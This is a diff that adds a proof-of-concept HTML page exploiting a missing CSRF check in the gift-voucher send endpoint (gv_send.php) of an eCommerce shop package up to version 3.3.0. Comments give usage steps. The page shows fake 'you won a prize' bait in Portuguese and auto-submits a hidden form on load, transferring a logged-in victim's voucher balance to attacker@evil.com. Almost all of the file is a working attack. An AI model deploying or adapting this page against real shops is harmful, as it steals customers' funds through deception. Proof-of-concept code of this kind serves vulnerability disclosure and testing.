@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<!-- PoC: CSRF Gift Voucher Hijack — modified eCommerce Shopsoftware <= 3.3.0
+     Endpoint: gv_send.php?action=process (no CSRF token validation)
+     Usage: replace TARGET with the shop origin, host on any other origin,
+     and open while a customer with GV balance is logged in.
+     Auto-submits on page load — the "prize" text is social-engineering bait. -->
+<html>
+<head><title>Você ganhou um prêmio!</title></head>
+<body>
+  <h1>Parabéns! Você foi selecionado para um prêmio.</h1>
+  <p>Clique abaixo para resgatar:</p>
+
+  <form id="f" action="http://TARGET/gv_send.php?action=process" method="POST">
+    <input type="hidden" name="to_email"  value="attacker@evil.com">
+    <input type="hidden" name="to_name"   value="Attacker">
+    <input type="hidden" name="send_name" value="Your Friend">
+    <input type="hidden" name="amount"    value="10">
+    <input type="hidden" name="message"   value="Congratulations!">
+  </form>
+
+  <script>
+    // Auto-submit on page load — no interaction required
+    document.getElementById('f').submit();
+  </script>
+</body>
+</html>
